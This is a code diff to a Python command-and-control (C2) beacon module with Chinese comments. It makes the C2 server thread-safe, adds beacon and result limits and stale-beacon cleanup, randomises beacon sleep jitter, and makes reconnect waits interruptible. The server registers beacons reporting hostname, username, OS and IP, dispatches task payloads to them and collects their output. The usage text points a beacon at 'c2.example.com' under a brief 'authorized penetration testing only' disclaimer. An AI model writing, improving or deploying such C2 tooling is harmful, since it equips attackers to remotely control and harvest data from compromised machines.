@@ -23,7 +23,6 @@ import platform
 import subprocess
 import threading
 import hashlib
-import random
 import logging
 from typing import Optional, Dict, List, Any, Callable
 from dataclasses import dataclass, field
@@ -283,7 +282,9 @@ class Beacon(BaseC2):
         for attempt in range(self.config.max_retries):
             delay = self.config.retry_delay * (2 ** attempt)
             logger.info(f"Reconnecting in {delay:.1f}s (attempt {attempt + 1}/{self.config.max_retries})")
-            time.sleep(delay)
+            # 使用 _stop_event.wait 支持中断
+            if self._stop_event.wait(delay):
+                return False  # 被中断
 
             if self.connect():
                 return True
@@ -549,11 +550,17 @@ class Beacon(BaseC2):
 
     def _calculate_sleep(self) -> float:
         """计算带抖动的睡眠时间"""
+        import secrets
         base = self.config.interval
         jitter = base * self.config.jitter
 
-        # 使用 random.uniform 而不是 (random.random() - 0.5) * 2
-        return base + random.uniform(-jitter, jitter)
+        # 使用 secrets 模块生成随机抖动（范围 -jitter 到 +jitter）
+        # secrets.randbelow 返回 [0, n)，转换为 [-jitter, +jitter]
+        if jitter > 0:
+            # 生成 0 到 2*jitter 范围的随机数，然后减去 jitter
+            random_offset = (secrets.randbelow(int(jitter * 2000)) / 1000.0) - jitter
+            return base + random_offset
+        return base
 
     # ==================== 通信方法 ====================
 
@@ -773,7 +780,7 @@ class Beacon(BaseC2):
 
 class BeaconServer:
     """
-    Beacon 服务器 (C2 Server)
+    Beacon 服务器 (C2 Server) - 线程安全版本
 
     接收和管理 Beacon 连接
 
@@ -782,24 +789,105 @@ class BeaconServer:
         server.run()
     """
 
-    def __init__(self, host: str = "0.0.0.0", port: int = 8080):
+    # 默认配置：防止内存泄漏
+    DEFAULT_MAX_BEACONS = 1000          # 最大 Beacon 数量
+    DEFAULT_MAX_RESULTS_PER_BEACON = 100  # 每个 Beacon 最大结果数
+    DEFAULT_BEACON_TIMEOUT = 3600       # Beacon 超时时间（秒）
+    DEFAULT_CLEANUP_INTERVAL = 300      # 清理间隔（秒）
+
+    def __init__(
+        self,
+        host: str = "0.0.0.0",
+        port: int = 8080,
+        max_beacons: int = DEFAULT_MAX_BEACONS,
+        max_results_per_beacon: int = DEFAULT_MAX_RESULTS_PER_BEACON,
+        beacon_timeout: float = DEFAULT_BEACON_TIMEOUT,
+    ):
         """
         初始化服务器
 
         Args:
             host: 监听地址
             port: 监听端口
+            max_beacons: 最大 Beacon 数量（防止内存泄漏）
+            max_results_per_beacon: 每个 Beacon 最大结果数
+            beacon_timeout: Beacon 超时时间（秒），超时后自动清理
         """
         self.host = host
         self.port = port
+        self.max_beacons = max_beacons
+        self.max_results_per_beacon = max_results_per_beacon
+        self.beacon_timeout = beacon_timeout
 
         # 存储
         self.beacons: Dict[str, BeaconInfo] = {}
         self.tasks: Dict[str, List[Task]] = {}      # beacon_id -> tasks
         self.results: Dict[str, List[TaskResult]] = {}  # beacon_id -> results
 
+        # 线程锁
+        self._beacons_lock = threading.Lock()
+        self._tasks_lock = threading.Lock()
+        self._results_lock = threading.Lock()
+
         self._app = None
         self._running = False
+        self._cleanup_thread: Optional[threading.Thread] = None
+
+    def _cleanup_stale_beacons(self) -> int:
+        """
+        清理过期的 Beacon（线程安全）
+
+        Returns:
+            清理的 Beacon 数量
+        """
+        now = time.time()
+        stale_ids = []
+
+        with self._beacons_lock:
+            for beacon_id, info in self.beacons.items():
+                if now - info.last_seen > self.beacon_timeout:
+                    stale_ids.append(beacon_id)
+
+            for beacon_id in stale_ids:
+                del self.beacons[beacon_id]
+
+        # 清理相关的 tasks 和 results
+        if stale_ids:
+            with self._tasks_lock:
+                for beacon_id in stale_ids:
+                    self.tasks.pop(beacon_id, None)
+
+            with self._results_lock:
+                for beacon_id in stale_ids:
+                    self.results.pop(beacon_id, None)
+
+            logger.info(f"清理了 {len(stale_ids)} 个过期 Beacon")
+
+        return len(stale_ids)
+
+    def _trim_results(self, beacon_id: str) -> None:
+        """
+        修剪结果列表，保持在限制内（需要在锁内调用）
+
+        Args:
+            beacon_id: Beacon ID
+        """
+        # 注意：调用者必须持有 _results_lock
+        if beacon_id in self.results:
+            results_list = self.results[beacon_id]
+            if len(results_list) > self.max_results_per_beacon:
+                # 保留最新的结果
+                self.results[beacon_id] = results_list[-self.max_results_per_beacon:]
+
+    def _cleanup_loop(self) -> None:
+        """后台清理循环"""
+        while self._running:
+            time.sleep(self.DEFAULT_CLEANUP_INTERVAL)
+            if self._running:
+                try:
+                    self._cleanup_stale_beacons()
+                except Exception as e:
+                    logger.error(f"清理 Beacon 失败: {e}")
 
     def add_task(
         self,
@@ -809,7 +897,7 @@ class BeaconServer:
         timeout: float = 300.0
     ) -> str:
         """
-        添加任务
+        添加任务（线程安全）
 
         Args:
             beacon_id: Beacon ID
@@ -820,22 +908,25 @@ class BeaconServer:
         Returns:
             任务 ID
         """
-        if beacon_id not in self.tasks:
-            self.tasks[beacon_id] = []
-
         task = Task.create(task_type, payload, timeout)
-        self.tasks[beacon_id].append(task)
+
+        with self._tasks_lock:
+            if beacon_id not in self.tasks:
+                self.tasks[beacon_id] = []
+            self.tasks[beacon_id].append(task)
 
         logger.info(f"Task added for {beacon_id}: {task.id}")
         return task.id
 
     def get_beacons(self) -> List[BeaconInfo]:
-        """获取所有 Beacon"""
-        return list(self.beacons.values())
+        """获取所有 Beacon（线程安全）"""
+        with self._beacons_lock:
+            return list(self.beacons.values())
 
     def get_results(self, beacon_id: str) -> List[TaskResult]:
-        """获取 Beacon 结果"""
-        return self.results.get(beacon_id, [])
+        """获取 Beacon 结果（线程安全）"""
+        with self._results_lock:
+            return list(self.results.get(beacon_id, []))
 
     def run(self) -> None:
         """运行服务器"""
@@ -854,19 +945,25 @@ class BeaconServer:
             beacon_id = data.get('beacon_id')
 
             if beacon_id:
-                if beacon_id not in self.beacons:
-                    self.beacons[beacon_id] = BeaconInfo(
-                        beacon_id=beacon_id,
-                        hostname=data.get('hostname', ''),
-                        username=data.get('username', ''),
-                        os_info=data.get('os_info', ''),
-                        arch=data.get('arch', ''),
-                        ip_address=data.get('ip_address', ''),
-                        pid=data.get('pid', 0),
-                    )
-                    logger.info(f"New beacon: {beacon_id}")
-                else:
-                    self.beacons[beacon_id].last_seen = time.time()
+                with self._beacons_lock:
+                    if beacon_id not in self.beacons:
+                        # 检查是否超过最大 Beacon 数量
+                        if len(self.beacons) >= self.max_beacons:
+                            logger.warning(f"达到最大 Beacon 数量限制 ({self.max_beacons})，拒绝新连接")
+                            return jsonify({"status": "error", "message": "server full"}), 503
+
+                        self.beacons[beacon_id] = BeaconInfo(
+                            beacon_id=beacon_id,
+                            hostname=data.get('hostname', ''),
+                            username=data.get('username', ''),
+                            os_info=data.get('os_info', ''),
+                            arch=data.get('arch', ''),
+                            ip_address=data.get('ip_address', ''),
+                            pid=data.get('pid', 0),
+                        )
+                        logger.info(f"New beacon: {beacon_id}")
+                    else:
+                        self.beacons[beacon_id].last_seen = time.time()
 
                 return jsonify({"status": "ok", "session": beacon_id})
 
@@ -874,22 +971,23 @@ class BeaconServer:
 
         @app.route('/api/tasks/<beacon_id>', methods=['GET'])
         def get_tasks(beacon_id):
-            tasks = self.tasks.get(beacon_id, [])
-            pending = [t for t in tasks if t.priority >= 0]
+            with self._tasks_lock:
+                tasks = self.tasks.get(beacon_id, [])
+                pending = [t for t in tasks if t.priority >= 0]
 
-            task_data = [
-                {
-                    'id': t.id,
-                    'type': t.type,
-                    'payload': t.payload,
-                    'timeout': t.timeout,
-                }
-                for t in pending
-            ]
+                task_data = [
+                    {
+                        'id': t.id,
+                        'type': t.type,
+                        'payload': t.payload,
+                        'timeout': t.timeout,
+                    }
+                    for t in pending
+                ]
 
-            # 标记为已发送
-            for t in pending:
-                t.priority = -1
+                # 标记为已发送
+                for t in pending:
+                    t.priority = -1
 
             return jsonify({"tasks": task_data})
 
@@ -898,22 +996,34 @@ class BeaconServer:
             data = request.json
             beacon_id = data.get('beacon_id')
 
-            if beacon_id not in self.results:
-                self.results[beacon_id] = []
-
             result = TaskResult(
                 task_id=data.get('task_id', ''),
                 success=data.get('success', False),
                 output=data.get('output'),
                 error=data.get('error'),
             )
-            self.results[beacon_id].append(result)
+
+            with self._results_lock:
+                if beacon_id not in self.results:
+                    self.results[beacon_id] = []
+                self.results[beacon_id].append(result)
+                # 修剪结果列表，防止内存泄漏
+                self._trim_results(beacon_id)
 
             logger.info(f"Result from {beacon_id}: task {result.task_id}")
             return jsonify({"status": "ok"})
 
         logger.info(f"Beacon server starting on {self.host}:{self.port}")
         self._running = True
+
+        # 启动后台清理线程
+        self._cleanup_thread = threading.Thread(
+            target=self._cleanup_loop,
+            daemon=True,
+            name="BeaconServer-Cleanup"
+        )
+        self._cleanup_thread.start()
+
         app.run(host=self.host, port=self.port, debug=False, threaded=True)
 
     def run_async(self) -> threading.Thread:
@@ -925,6 +1035,59 @@ class BeaconServer:
     def stop(self) -> None:
         """停止服务器"""
         self._running = False
+        # 清理线程会在下一个循环自动退出
+
+    def clear_beacon(self, beacon_id: str) -> bool:
+        """
+        手动清理指定 Beacon（线程安全）
+
+        Args:
+            beacon_id: Beacon ID
+
+        Returns:
+            是否成功清理
+        """
+        removed = False
+
+        with self._beacons_lock:
+            if beacon_id in self.beacons:
+                del self.beacons[beacon_id]
+                removed = True
+
+        with self._tasks_lock:
+            self.tasks.pop(beacon_id, None)
+
+        with self._results_lock:
+            self.results.pop(beacon_id, None)
+
+        if removed:
+            logger.info(f"手动清理 Beacon: {beacon_id}")
+
+        return removed
+
+    def get_stats(self) -> Dict[str, Any]:
+        """
+        获取服务器统计信息（线程安全）
+
+        Returns:
+            统计信息字典
+        """
+        with self._beacons_lock:
+            beacon_count = len(self.beacons)
+
+        with self._tasks_lock:
+            task_count = sum(len(tasks) for tasks in self.tasks.values())
+
+        with self._results_lock:
+            result_count = sum(len(results) for results in self.results.values())
+
+        return {
+            "beacons": beacon_count,
+            "max_beacons": self.max_beacons,
+            "tasks": task_count,
+            "results": result_count,
+            "running": self._running,
+        }
 
 
 # ==================== 便捷函数 ====================
@@ -989,15 +1152,16 @@ __all__ = [
 
 
 if __name__ == "__main__":
-    print("Beacon Module - Lightweight C2 Beacon")
-    print("=" * 50)
-    print("\n[!] This module is for authorized penetration testing only!")
-    print("\nUsage:")
-    print("  # Server side:")
-    print("  from core.c2 import start_beacon_server")
-    print("  server = start_beacon_server(port=8080)")
-    print("")
-    print("  # Client side:")
-    print("  from core.c2 import create_beacon")
-    print("  beacon = create_beacon('http://c2.example.com', port=8080)")
-    print("  beacon.run()")
+    logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')
+    logger.info("Beacon Module - Lightweight C2 Beacon")
+    logger.info("=" * 50)
+    logger.warning("[!] This module is for authorized penetration testing only!")
+    logger.info("Usage:")
+    logger.info("  # Server side:")
+    logger.info("  from core.c2 import start_beacon_server")
+    logger.info("  server = start_beacon_server(port=8080)")
+    logger.info("")
+    logger.info("  # Client side:")
+    logger.info("  from core.c2 import create_beacon")
+    logger.info("  beacon = create_beacon('http://c2.example.com', port=8080)")
+    logger.info("  beacon.run()")
